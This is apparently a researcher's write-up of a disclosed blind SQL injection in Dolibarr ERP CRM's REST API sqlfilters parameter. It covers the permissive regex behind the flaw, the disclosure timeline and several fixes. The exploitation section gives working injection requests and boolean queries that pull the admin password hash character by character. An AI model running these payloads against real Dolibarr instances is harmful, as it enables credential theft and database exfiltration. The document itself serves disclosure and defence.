---
title: "Bypassing API Sanitization: Blind SQL Injection in Dolibarr ERP CRM REST API"
description: "Technical walkthrough of identifying, exploiting, and responsibly disclosing a Blind SQL Injection vulnerability in Dolibarr ERP CRM (CVE-2026-36497) caused by a permissive Regular Expression."
pubDate: 2026-05-06
severity: "High"
tags: ["CVE", "SQL Injection", "Regex Bypass", "Web Security", "Dolibarr", "API"]
---

## Overview

During a white-box security audit of **Dolibarr ERP CRM** — a widely deployed open-source enterprise resource planning and CRM system — I identified a high-severity vulnerability within its REST API filtering mechanism.

The finding (**CVE-2026-36497**) is an authenticated Blind SQL Injection that allows an attacker with basic API access to extract arbitrary data from the underlying database. The root cause is not a missing sanitization layer, but a flawed one: a Regular Expression designed to block dangerous SQL characters that inadvertently permits the whitespace character — the single primitive that makes SQL a language.

| Field               | Details                                                                 |
|---------------------|-------------------------------------------------------------------------|
| **CVE**             | [CVE-2026-36497](https://www.cve.org/CVERecord?id=CVE-2026-36497)      |
| **GHSA**            | [GHSA-px39-mwcr-hvxp](https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-px39-mwcr-hvxp) |
| **CWE**             | CWE-89 — Improper Neutralization of Special Elements in SQL Commands    |
| **Severity**        | High                                                                    |
| **CVSS 4.0 Vector** | `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N`             |
| **Affected**        | Dolibarr ERP CRM ≤ 20.0.0 (confirmed), develop branch at time of audit |
| **Fixed In**        | Dolibarr v23.0.0 (2026-03-25)                                          |
| **Reporter**        | Guilherme Mury (Kilserv)                                                |

---

## The Core Concept: Why a Space Breaks Everything

Before the technical breakdown, it is worth establishing why this vulnerability exists at a conceptual level — because the lesson applies far beyond Dolibarr.

SQL is a language. Like any language, it requires delimiters between its tokens. In most injection scenarios, defenders focus on neutralizing characters that mark string boundaries (`'`) or statement terminators (`;`). The assumption is: *if we block quotes, the attacker cannot inject string literals; if we block semicolons, they cannot chain statements.*

This is the wrong threat model for the `IN` operator.

`IN` accepts a subquery as its argument. A subquery is not a string — it requires no quotes to be syntactically valid. It requires only keywords, identifiers, and spaces. If an attacker can write spaces, they can write SQL sentences. The rest is noise.

---

## Target and Methodology

Dolibarr ERP CRM is a PHP-based monolith used globally to manage billing, inventory, HR, and customer data. This research was conducted against the `develop` branch using a hybrid approach:

**Static Analysis** — Code review of `htdocs/core/lib/functions.lib.php`, tracing how user input travels from the API controller layer down to the database abstraction layer, with particular focus on the `sqlfilters` parameter parsing chain.

**Dynamic Validation** — Local instance deployment with Burp Suite, crafting boolean-based payloads to map the database schema and confirm end-to-end data exfiltration.

---

## Vulnerability Analysis

### Entry Point: The `sqlfilters` Parameter

Dolibarr's REST API exposes a `sqlfilters` parameter across multiple endpoints (invoices, contacts, products, etc.) to allow clients to filter records dynamically. A request such as the following is entirely expected behavior:

```
GET /api/index.php/invoices?sqlfilters=(t.status:=:1)
```

The backend parses this filter, translates it into a SQL `WHERE` clause fragment, and appends it to the query. The critical translation happens inside `dolForgeSQLCriteriaCallback` in `htdocs/core/lib/functions.lib.php`.

### The Vulnerable Code

When the optional security constant `MAIN_DISALLOW_UNSECURED_SELECT_INTO_EXTRAFIELDS_FILTER` is not defined — which is the **default configuration** in versions prior to the fix — the function sanitizes filter values using the following Regular Expression (approximately line 15865):

```php
} elseif (!getDolGlobalString("MAIN_DISALLOW_UNSECURED_SELECT_INTO_EXTRAFIELDS_FILTER")) {
    // Intended to strip dangerous characters before SQL embedding
    $tmpelemarray[$tmpkey] = preg_replace('/[^a-z0-9_<>=!\s]/i', '', $tmpelem);
}
```

### Root Cause: The `\s` Allowance

The character class `[^a-z0-9_<>=!\s]` defines what is *blocked* by negation — stripping any character that is not alphanumeric, an underscore, a comparison operator, an exclamation mark, or whitespace.

The `\s` shorthand matches space, tab, newline, carriage return, and form feed. Its inclusion is likely an oversight introduced to support multi-word filter values. The result is that the following characters survive sanitization intact:

- All letters and digits
- Whitespace (space, tab)
- Comparison operators (`<`, `>`, `=`, `!`)
- Underscores

This set is sufficient to write a complete SQL subquery. No quotes are needed for numeric comparisons. No parentheses are needed because the `IN` operator's argument boundary is already established by the surrounding query structure. The sanitization boundary is bypassed entirely through syntax, not through character smuggling.

---

## Exploitation

### Payload Construction

An authenticated attacker sends a crafted GET request to any API endpoint that exposes `sqlfilters`:

```http
GET /dolibarr/api/index.php/invoices?sqlfilters=(t.rowid:in:select 1 from llx_user where rowid=1) HTTP/1.1
Host: target.local
dolapikey: <USER_API_KEY>
```

After the Regex sanitization runs, the value `select 1 from llx_user where rowid=1` passes through intact — every character is on the allowlist. The backend constructs the following effective query:

```sql
SELECT ... FROM llx_facture AS t
WHERE ...
AND (t.rowid IN (select 1 from llx_user where rowid=1))
```

### Boolean-Based Inference

The injection is blind — no data surfaces directly in the response. The attacker instead infers information from the API's binary output:

- **True condition** (subquery returns a row) → the API returns the requested record.
- **False condition** (subquery returns nothing) → the API returns an empty list.

This boolean signal is enough to enumerate the entire database. A typical credential extraction workflow proceeds as follows:

**Step 1 — Confirm the administrator row exists:**
```
sqlfilters=(t.rowid:in:select 1 from llx_user where rowid=1 and admin=1)
```

**Step 2 — Extract the password hash character by character:**
```
sqlfilters=(t.rowid:in:select 1 from llx_user where rowid=1 and substring(pass_crypted,1,1)=a)
sqlfilters=(t.rowid:in:select 1 from llx_user where rowid=1 and substring(pass_crypted,1,1)=b)
...
```

Each request that returns a non-empty response confirms a character. Iterating across all positions and the full character space yields the complete hash. In practice this process is automated, reducing extraction time substantially.

### Impact

An authenticated attacker with the lowest possible API privilege level — read access to a single module — can perform a full database extraction. In an ERP context, this translates to complete exposure of administrator credential hashes, employee PII, client and vendor financial records, and billing history.

---

## Responsible Disclosure Timeline
 
The disclosure process for this vulnerability stretched across nearly five months and required direct engagement with MITRE after the vendor went silent during the patch development window. The complete timeline is documented below.
 
- **Jan 02, 2026** — Vulnerability identified and reported to the Dolibarr team via GitHub Security Advisory ([GHSA-px39-mwcr-hvxp](https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-px39-mwcr-hvxp)).
- **Jan 07, 2026** — Vendor acknowledged and confirmed the vulnerability. Proposed fix: force `MAIN_DISALLOW_UNSECURED_SELECT_INTO_EXTRAFIELDS_FILTER = 1` in API context.
- **Jan 13, 2026** — Follow-up requesting patch timeline and CVE assignment plan.
- **Jan 26, 2026** — Second follow-up. Informed vendor that CVE request would be filed with MITRE if no response by end of week.
- **Feb 26, 2026** — 90-day disclosure deadline formally communicated. CVE request submitted to MITRE independently, given vendor silence on patch timeline.
- **Mar 01, 2026** — Vendor confirmed fix would be included in v23, to be released soon.
- **Mar 25, 2026** — Patch released in Dolibarr v23.0.0. Advisory closed by vendor.
- **May 06, 2026** — MITRE assigned CVE-2026-36497. CVE record updated with public references. Technical write-up published.
The decision to submit the CVE request to MITRE independently — rather than waiting for the vendor to act as CNA — was made after multiple follow-up attempts went unanswered. This is a standard step in responsible disclosure when a vendor's patch timeline becomes unclear and the 90-day window is approaching.
 
---

## Remediation

### The Vendor's Fix (v23.0.0)

The Dolibarr team resolved the issue by forcing `MAIN_DISALLOW_UNSECURED_SELECT_INTO_EXTRAFIELDS_FILTER` to `1` as a default whenever code execution enters an API context — not merely as a configuration option, but as a hard default. This routes all API filter values through a stricter validation path regardless of how the instance is configured.

### The Architectural Fix

To address the root cause at the regex level, removing `\s` from the allowlist is sufficient:

```php
// Vulnerable — spaces permitted, SQL sentence structure intact
$tmpelemarray[$tmpkey] = preg_replace('/[^a-z0-9_<>=!\s]/i', '', $tmpelem);

// Corrected — spaces disallowed, subquery syntax broken
$tmpelemarray[$tmpkey] = preg_replace('/[^a-z0-9_<>=!]/i', '', $tmpelem);
```

Removing `\s` collapses any injected subquery into a sequence of concatenated tokens. `select 1 from llx_user` becomes `select1fromllx_user` — syntactically invalid SQL that the database engine rejects before execution.

### The Fundamental Fix

Both approaches above are mitigations. The definitive solution is replacing the entire custom parsing approach with parameterized queries (prepared statements) for any user-controlled input that touches the database layer. Regex-based deny-lists are inherently fragile: they must anticipate every possible attack primitive in advance. Parameterized queries invert this model — the database engine never interprets user input as SQL syntax in the first place, making the threat model irrelevant by construction.

---

## Key Takeaways

**For developers:** Sanitizing SQL input using Regular Expressions or deny-lists is an architecturally unsound pattern. The omission of a single token from the character class — `\s` in this case — is sufficient to unravel the entire defense. This is not carelessness; it is the inherent brittleness of trying to enumerate danger. Parameterized queries eliminate this class of problem entirely.

**For security auditors:** When reviewing API endpoints that expose dynamic filter or search parameters, treat custom parser functions as high-priority targets. The translation layer between a REST filter syntax and a SQL clause is a frequent site of logical bypasses. Trace the full execution path from HTTP parameter to query construction, paying particular attention to operators — like `IN` — that accept subqueries as first-class arguments. A single permissive token in a character class can be the difference between a working filter and a full database extraction primitive.

**For defenders:** Ensure Dolibarr ERP CRM instances are updated to version 23.0.0 or later. If an immediate update is not feasible, explicitly set `MAIN_DISALLOW_UNSECURED_SELECT_INTO_EXTRAFIELDS_FILTER = 1` in the application configuration as an interim measure, and restrict API access to trusted internal IP addresses.

---

*Reported under responsible disclosure. All testing was performed in an isolated local environment. No production systems were accessed.*